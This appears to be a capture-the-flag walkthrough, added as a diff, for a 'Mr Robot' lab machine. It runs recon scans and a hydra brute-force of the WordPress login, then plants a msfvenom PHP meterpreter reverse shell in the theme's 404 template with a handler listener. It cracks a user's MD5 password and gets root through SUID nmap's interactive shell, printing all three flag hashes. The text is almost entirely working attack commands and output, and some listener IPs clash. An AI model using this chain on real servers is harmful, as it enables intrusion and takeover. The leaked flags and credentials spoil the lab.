@@ -1,0 +1,135 @@
+nmap -sC -sV -oN nmap/initial 10.10.197.239
+
+gobuster dir -u http://10.10.197.239/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+found /robots
+check this page, found User-agent: * fsocity.dic key-1-of-3.txt
+wget them
+key1: 073403c8a58a1f80d943455fb30724b9
+
+found /wp-login.php
+
+uniscan -u http://10.10.197.239/ -qweds 
+nikto -h 10.10.197.239 -output niktolog.txt
+
+hydra -l Elliot -P fsocity.dic 10.10.197.239 http-post-form "/wp-login:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=10.10.197.239/wp-admin/&testcookie=1:S=302"
+
+[80][http-post-form] host: 10.10.157.219   login: "Elliot"  password: "ER28-0652"
+
+
+Appearance –> Editor –> then on the right click 404 Template.
+
+ generate our backdoor
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.2.64.179 LPORT=4444 -f raw -o payload.php
+
+ Create our payload handler
+msfconsole
+$ use exploit/multi/handler
+$ set payload php/meterpreter/reverse_tcp
+$ set LHOST 192.168.0.32
+$ set LPORT 4444
+$ run
+
+Paste the payload.php at the 404 Tamplate
+
+[*] Started reverse TCP handler on 192.168.0.32:4444 
+[*] Starting the payload handler...
+
+meterpreter >
+meterpreter > shell 
+Process 1797 created.
+Channel 0 created. 
+pwd 
+/opt/bitnami/apps/wordpress/htdocs 
+whoami 
+daemon
+cd / 
+ls 
+bin 
+boot
+dev 
+etc 
+home 
+initrd.img 
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root 
+run 
+sbin 
+srv 
+sys 
+tmp
+usr
+var
+vmlinuz
+cd home
+ls
+robot
+cd robot
+ls
+key-2-of-3.txt
+password.raw-md5
+cat key-2-of-3.txt
+cat: key-2-of-3.txt: Permission denied
+cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b # the MD5 of the password !! 
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+daemon@linux:/home/robot$
+daemon@linux:/home/robot$ su robot
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+robot@linux:~$
+robot@linux:~$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959 # user flag 
+# To find the root process 
+find / -perm +6000 2>/dev/null | grep '/bin/'
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/mail-touchlock
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/screen
+/usr/bin/mail-unlock
+/usr/bin/mail-lock
+/usr/bin/chsh
+/usr/bin/crontab
+/usr/bin/chfn
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/expiry
+/usr/bin/dotlockfile
+/usr/bin/sudo
+/usr/bin/ssh-agent
+/usr/bin/wall
+/usr/local/bin/nmap
+robot@linux:/$ nmap --interactive
+nmap --interactive
+## After some investigation on forum I found there is a weakness in Nmap, which you can be setting up into interactive mode. That allows to run shell commands inside of nmap.
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+!sh
+# ls
+ls
+bin   dev  home        lib    lost+found  mnt  proc  run   srv tmp  var
+boot  etc  initrd.img  lib64  media   opt  root  sbin  sys usr  vmlinuz
+# cd /root
+cd /root
+# ls
+ls
+firstboot_done key-3-of-3.txt
+cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4 # root flag 
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+find / -perm +6000 2>/dev/null | grep '/bin/'
